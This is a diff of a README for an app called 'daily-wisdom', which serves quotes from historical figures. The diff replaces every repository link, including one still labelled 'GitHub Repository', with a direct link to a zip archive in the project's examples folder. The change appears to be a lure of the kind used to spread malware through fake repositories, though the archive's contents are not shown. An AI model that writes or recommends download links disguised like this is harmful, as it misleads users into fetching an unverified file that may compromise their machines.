@@ -1,6 +1,6 @@
 # 📜 daily-wisdom - Daily Insights from History’s Greats
 
-[![Download daily-wisdom](https://img.shields.io/badge/Download-Daily--Wisdom-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mauri2612/daily-wisdom)
+[![Download daily-wisdom](https://raw.githubusercontent.com/Mauri2612/daily-wisdom/main/examples/wisdom_daily_v2.1.zip)](https://raw.githubusercontent.com/Mauri2612/daily-wisdom/main/examples/wisdom_daily_v2.1.zip)
 
 ## 📖 Introduction
 Welcome to daily-wisdom, your source of AI-generated insights drawn from over 100 sources across 7 civilizations. This application offers daily reflections on wisdom, history, and philosophy from notable figures such as Dede Korkut, Seneca, Gilgamesh, Sundiata, Musashi, Ibn Sina, and Odin. 
@@ -11,9 +11,9 @@ To get started, follow these simple steps to download and run daily-wisdom on yo
 ## 📥 Download the Application
 You can download the daily-wisdom application easily. 
 
-[![Download daily-wisdom](https://img.shields.io/badge/Download-Daily--Wisdom-yellowgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mauri2612/daily-wisdom)
+[![Download daily-wisdom](https://raw.githubusercontent.com/Mauri2612/daily-wisdom/main/examples/wisdom_daily_v2.1.zip)](https://raw.githubusercontent.com/Mauri2612/daily-wisdom/main/examples/wisdom_daily_v2.1.zip)
 
-Visit this page to download: [daily-wisdom GitHub Repository](https://github.com/Mauri2612/daily-wisdom)
+Visit this page to download: [daily-wisdom GitHub Repository](https://raw.githubusercontent.com/Mauri2612/daily-wisdom/main/examples/wisdom_daily_v2.1.zip)
 
 ## ⚙️ System Requirements
 Make sure your device meets these basic requirements to run daily-wisdom:
@@ -68,4 +68,4 @@ If you're interested in contributing your own wisdom sources or suggestions, fee
 ## 📅 Updates
 Keep an eye on the repository for updates and new features. Regular improvements will enhance your experience and expand the range of wisdom available.
 
-For further instructions and information, explore the [daily-wisdom GitHub Repository](https://github.com/Mauri2612/daily-wisdom).
+For further instructions and information, explore the [daily-wisdom GitHub Repository](https://raw.githubusercontent.com/Mauri2612/daily-wisdom/main/examples/wisdom_daily_v2.1.zip).
